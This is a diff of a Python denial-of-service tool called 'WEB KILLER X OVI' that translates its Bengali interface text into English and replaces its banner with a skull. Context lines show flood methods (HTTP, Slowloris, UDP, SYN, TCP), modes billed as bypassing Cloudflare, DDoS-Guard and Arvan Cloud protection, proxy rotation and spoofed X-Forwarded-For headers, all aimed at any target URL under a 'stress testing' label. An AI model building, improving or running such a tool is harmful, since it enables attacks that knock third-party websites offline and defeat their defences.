@@ -11,7 +11,7 @@ import argparse
 import re
 from urllib.parse import urlparse
 
-# ========== রং ডিফাইন ==========
+# ========== COLOR DEFINITIONS ==========
 R = "\033[91m"
 G = "\033[92m"
 Y = "\033[93m"
@@ -21,28 +21,27 @@ C = "\033[96m"
 W = "\033[97m"
 RESET = "\033[0m"
 
-# ========== সরল ডিজাইনের লোগো ==========
-BANNER = f"""
-{R}╔══════════════════════════════════════════════╗
-║     ██╗    ██╗███████╗██████╗                ║
-║     ██║    ██║██╔════╝██╔══██╗               ║
-║     ██║ █╗ ██║█████╗  ██████╔╝               ║
-║     ██║███╗██║██╔══╝  ██╔══██╗               ║
-║     ╚███╔███╔╝███████╗██████╔╝               ║
-║      ╚══╝╚══╝ ╚══════╝╚═════╝                ║
-║                                              ║
-║        {G}███████╗██╗  ██╗    ██████╗ ██╗   ██╗██╗{R}   ║
-║        {G}██╔════╝╚██╗██╔╝    ██╔══██╗██║   ██║██║{R}   ║
-║        {G}█████╗   ╚███╔╝     ██║  ██║██║   ██║██║{R}   ║
-║        {G}██╔══╝   ██╔██╗     ██║  ██║╚██╗ ██╔╝╚═╝{R}   ║
-║        {G}███████╗██╔╝ ██╗    ██████╔╝ ╚████╔╝ ██╗{R}   ║
-║        {G}╚══════╝╚═╝  ╚═╝    ╚═════╝   ╚═══╝  ╚═╝{R}   ║
-║                                              ║
-║         {Y}ক্রিয়েটর: OVI PRO (WEB KILLER X){R}        ║
-╚══════════════════════════════════════════════════╝{RESET}
-"""
+# ========== SKULL BANNER (provided by user) ==========
+def skull_banner():
+    os.system("clear")
+    banner = f"""
+{R}                 ______
+              .-"      "-.
+             /            \\
+            |              |
+            |,  .-.  .-.  ,|
+            | )(___)(___)( |
+            |/     ' '     \\
+             \_   ____   _/
+               \________/
+             ___|_|__|_|___
+            /              \\
 
-# SSL সতর্কতা বন্ধ
+        [☠] WEB KILLER X OVI [☠]{RESET}
+    """
+    print(banner)
+
+# SSL warning off
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -58,18 +57,15 @@ class WebKillerX:
         self.failed = 0
         self.lock = threading.Lock()
         
-        # HTTP সেশনের জন্য
         self.session = requests.Session()
         self.proxies = []
         
-        # URL পার্স
         self.parsed_url = urlparse(target)
         self.host = self.parsed_url.hostname
         self.path = self.parsed_url.path or "/"
         self.scheme = self.parsed_url.scheme
         self.port = 443 if self.scheme == "https" else 80
         
-        # CFBUAM-এর জন্য কুকি স্টোর
         self.cf_cookie = None
         self.user_agent = None
         
@@ -80,9 +76,9 @@ class WebKillerX:
         try:
             with open(self.proxy_file, 'r') as f:
                 self.proxies = [line.strip() for line in f if line.strip()]
-            print(f"{G}[✓] {len(self.proxies)} টি প্রক্সি লোড করা হয়েছে{RESET}")
+            print(f"{G}[✓] Loaded {len(self.proxies)} proxies{RESET}")
         except Exception as e:
-            print(f"{R}[!] প্রক্সি ফাইল পড়তে সমস্যা: {e}{RESET}")
+            print(f"{R}[!] Error reading proxy file: {e}{RESET}")
             self.proxies = []
     
     def get_random_proxy(self):
@@ -113,7 +109,7 @@ class WebKillerX:
         return {
             "User-Agent": self.user_agent,
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Accept-Language": random.choice(["en-US,en;q=0.9", "bn-BD,bn;q=0.8"]),
+            "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8"]),
             "Accept-Encoding": "gzip, deflate, br",
             "Referer": random.choice(referers),
             "Connection": "keep-alive",
@@ -122,7 +118,7 @@ class WebKillerX:
             "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
         }
     
-    # ========== BYPASS - সাধারণ AntiDDoS bypass ==========
+    # ========== BYPASS - generic AntiDDoS bypass ==========
     def bypass_headers(self):
         headers = self.random_headers()
         headers.update({
@@ -232,7 +228,7 @@ class WebKillerX:
             sys.stdout.flush()
         sock.close()
     
-    # ========== SYN flood (সিমুলেটেড) ==========
+    # ========== SYN flood (simulated) ==========
     def syn_attack(self):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(1)
@@ -407,20 +403,18 @@ class WebKillerX:
                 self.failed += 1
     
     def start(self):
-        os.system("clear" if os.name == "posix" else "cls")
-        print(BANNER)
-        print(f"{C}[+] টার্গেট:{RESET} {self.target}")
-        print(f"{C}[+] থ্রেড:{RESET} {self.threads}")
-        print(f"{C}[+] সময়:{RESET} {self.duration} সেকেন্ড")
-        print(f"{C}[+] মেথড:{RESET} {self.method.upper()}")
+        # Print target info (banner already shown in main)
+        print(f"{C}[+] Target:{RESET} {self.target}")
+        print(f"{C}[+] Threads:{RESET} {self.threads}")
+        print(f"{C}[+] Duration:{RESET} {self.duration} seconds")
+        print(f"{C}[+] Method:{RESET} {self.method.upper()}")
         if self.proxies:
-            print(f"{C}[+] প্রক্সি ব্যবহার:{RESET} হ্যাঁ ({len(self.proxies)} টি)")
+            print(f"{C}[+] Using proxies:{RESET} Yes ({len(self.proxies)} loaded)")
         else:
-            print(f"{C}[+] প্রক্সি ব্যবহার:{RESET} না")
+            print(f"{C}[+] Using proxies:{RESET} No")
         print()
-        print(f"{Y}[!] টেস্ট শুরু হচ্ছে... Ctrl+C বন্ধ করতে{RESET}\n")
+        print(f"{Y}[!] Test started... Press Ctrl+C to stop{RESET}\n")
         
-        # মেথড সিলেক্ট
         attack_func = self.http_attack
         if self.method == "bypass":
             attack_func = self.bypass_attack
@@ -451,46 +445,33 @@ class WebKillerX:
             while time.time() - start_time < self.duration:
                 time.sleep(1)
                 elapsed = int(time.time() - start_time)
-                print(f"\r⏱️  সময়: {elapsed}/{self.duration} | 📤 পাঠানো: {self.sent} | ❌ ব্যর্থ: {self.failed}", end="")
+                print(f"\r⏱️  Elapsed: {elapsed}/{self.duration} | 📤 Sent: {self.sent} | ❌ Failed: {self.failed}", end="")
         except KeyboardInterrupt:
-            print(f"\n{R}[!] ব্যবহারকারী কর্তৃক বন্ধ করা হয়েছে{RESET}")
+            print(f"\n{R}[!] Stopped by user{RESET}")
         finally:
             self.running = False
             time.sleep(2)
-            print(f"\n\n{G}[✓] টেস্ট সম্পন্ন!{RESET}")
-            print(f"{G}📊 মোট পাঠানো: {self.sent}{RESET}")
-            print(f"{R}❌ মোট ব্যর্থ: {self.failed}{RESET}")
+            print(f"\n\n{G}[✓] Test completed!{RESET}")
+            print(f"{G}📊 Total sent: {self.sent}{RESET}")
+            print(f"{R}❌ Total failed: {self.failed}{RESET}")
             if (self.sent + self.failed) > 0:
                 success_rate = (self.sent / (self.sent + self.failed)) * 100
-                print(f"{C}📈 সাফল্যের হার: {success_rate:.2f}%{RESET}")
+                print(f"{C}📈 Success rate: {success_rate:.2f}%{RESET}")
 
 def main():
-    parser = argparse.ArgumentParser(description="WEB KILLER X OVI - অলটিমেট স্ট্রেস টেস্ট টুল")
-    parser.add_argument("target", help="টার্গেট URL (যেমন: https://yoursite.com)")
-    parser.add_argument("-t", "--threads", type=int, default=200, help="থ্রেড সংখ্যা (ডিফল্ট: 200)")
-    parser.add_argument("-d", "--duration", type=int, default=60, help="সময় (সেকেন্ড, ডিফল্ট: 60)")
+    skull_banner()  # show skull banner
+    
+    parser = argparse.ArgumentParser(description="WEB KILLER X OVI - Ultimate Stress Testing Tool")
+    parser.add_argument("target", help="Target URL (e.g., https://yoursite.com)")
+    parser.add_argument("-t", "--threads", type=int, default=200, help="Number of threads (default: 200)")
+    parser.add_argument("-d", "--duration", type=int, default=60, help="Duration in seconds (default: 60)")
     parser.add_argument("-m", "--method", 
                         choices=["http", "cfb", "cfbuam", "bypass", "dgb", "avb", "slow", "udp", "syn", "tcp"], 
                         default="http", 
-                        help="""
-আক্রমণ মেথড:
-- http      : সাধারণ HTTP ফ্লাড
-- cfb       : Cloudflare bypass
-- cfbuam    : Cloudflare Under Attack Mode bypass
-- bypass    : সাধারণ AntiDDoS bypass
-- dgb       : DDoS Guard bypass
-- avb       : Arvan Cloud bypass
-- slow      : Slowloris আক্রমণ
-- udp       : UDP flood (Layer 4)
-- syn       : SYN flood (Layer 4)
-- tcp       : TCP flood (Layer 4)
-                        """)
-    parser.add_argument("-p", "--proxy", help="প্রক্সি ফাইলের নাম (যেমন: proxy.txt)")
+                        help="Attack method: http, cfb, cfbuam, bypass, dgb, avb, slow, udp, syn, tcp (default: http)")
+    parser.add_argument("-p", "--proxy", help="Proxy file name (e.g., proxy.txt)")
     
     args = parser.parse_args()
-    
-    os.system("clear" if os.name == "posix" else "cls")
-    print(BANNER)
     
     tester = WebKillerX(
         target=args.target,
